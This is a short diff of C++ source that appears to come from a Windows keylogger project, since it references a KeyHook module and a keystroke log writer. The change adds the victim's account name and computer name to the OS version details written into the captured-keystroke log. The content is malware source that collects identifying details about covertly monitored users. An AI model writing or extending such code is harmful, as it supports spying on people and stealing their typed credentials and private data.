@@ -36,7 +36,10 @@ int main() {
   std::ostringstream ostream;
   DWORD major = pClientInfo->osVersionInfo.dwMajorVersion;
   DWORD minor = pClientInfo->osVersionInfo.dwMinorVersion;
-  ostream << "\n[*] OS Info: " << major << " " << minor << " [*]";
+  char *acc = pClientInfo->accountName;
+  char *com = pClientInfo->computerName;
+  ostream << "\n[*] OS Info: Major - " << major << "; Minor - " << minor << " [*]"
+		  << "\n[*] Account Info: User -" << acc << "; Computer - " << com << " [*]";
   std::string write = ostream.str();
   Stream::WriteLog(write, KeyHook::activeProcess, false);
 
